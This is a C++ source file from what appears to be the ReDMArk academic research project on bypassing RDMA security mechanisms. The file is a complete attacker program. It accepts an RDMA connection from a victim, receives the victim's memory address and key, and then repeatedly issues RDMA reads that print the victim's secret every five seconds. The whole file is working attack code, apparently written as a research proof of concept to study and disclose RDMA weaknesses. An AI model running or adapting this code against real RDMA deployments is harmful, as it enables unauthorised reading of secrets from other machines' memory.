/**                                                                                                      
 * ReDMArk: Bypassing RDMA Security Mechanisms
 * 
 * An attacker code that listens for a connection from a victim.
 *
 * Copyright (c) 2020-2021 ETH-Zurich. All rights reserved.
 * 
 * Author(s): Konstantin Taranov <konstantin.taranov@inf.ethz.ch>
 * 
 */
#include "verbsEP.hpp"
#include "connectRDMA.hpp"
#include <chrono>
#include "cxxopts.hpp"
#include <thread> 
 
cxxopts::ParseResult
parse(int argc, char* argv[])
{
    cxxopts::Options options(argv[0], "Attacker software.");
    options
      .positional_help("[optional args]")
      .show_positional_help();
 
  try
  {
 
    options.add_options()
      ("a,address", "IP address of the attacker", cxxopts::value<std::string>(), "IP")
      ("help", "Print help")
     ;
 
    auto result = options.parse(argc, argv);

    if (result.count("help"))
    {
      std::cout << options.help({""}) << std::endl;
      exit(0);
    }

    if (result.count("address") == 0)
    {
      std::cout << options.help({""}) << std::endl;
      exit(0);
    }

    return result;

  } catch (const cxxopts::OptionException& e)
  {
    std::cout << "error parsing options: " << e.what() << std::endl;
    std::cout << options.help({""}) << std::endl;
    exit(1);
  }
}

int main(int argc, char* argv[]){
 
  auto allparams = parse(argc,argv);
  std::string ip = allparams["address"].as<std::string>(); // "192.168.1.20"; .c_str()
  int port = 9999;

  printf("Server will be created at IP:port %s:%d\n",const_cast<char*>(ip.c_str()),port);
  printf("Do not forget to modify victim's code to have the same IP:port\n");

  ServerRDMA * server = new ServerRDMA(const_cast<char*>(ip.c_str()),port);
  struct ibv_qp_init_attr attr;
  struct rdma_conn_param conn_param;
 
 
  memset(&attr, 0, sizeof(attr));
  attr.cap.max_send_wr = 1;
  attr.cap.max_recv_wr = 5;
  attr.cap.max_send_sge = 1;
  attr.cap.max_recv_sge = 1;
  attr.cap.max_inline_data = 0;
  attr.qp_type = IBV_QPT_RC;

  memset(&conn_param, 0 , sizeof(conn_param));
  conn_param.responder_resources = 2;
  conn_param.initiator_depth = 2;
  conn_param.retry_count = 3;  
  conn_param.rnr_retry_count = 3; 
 
  struct ibv_pd *pd = server->create_pd();



  VerbsEP* ep = server->acceptEP(&attr,&conn_param,pd);


  char* ptr = (char*)malloc(4096);
  struct ibv_mr * mr = ep->reg_mem(ptr,4096);
  
  ep->post_recv(0,  mr);
  
  struct ibv_wc wc;
  while( ep->poll_recv_completion(&wc) == 0){
  
  }
  printf("Received memory information from a victim\n");

 
  struct ibv_sge* sges = (struct ibv_sge*)ptr;

  struct ibv_sge sge = sges[0];
 
  printf("Victim's secret should be at: %lu rkey %u \n",sge.addr ,sge.lkey);
 

  while(true){
    int ret = ep->read_signaled(0, (uint64_t)ptr, mr->lkey, sge.addr, sge.lkey, 128);
    assert(ret==0 && "Failed to issue an RDMA read.");
    while( ep->poll_send_completion(&wc) == 0){

    }
    printf("[%d]client secret :  %s\n", wc.status, ptr );
    std::this_thread::sleep_for(std::chrono::milliseconds(5000));
  }

  return 0; 
}

 
 
 
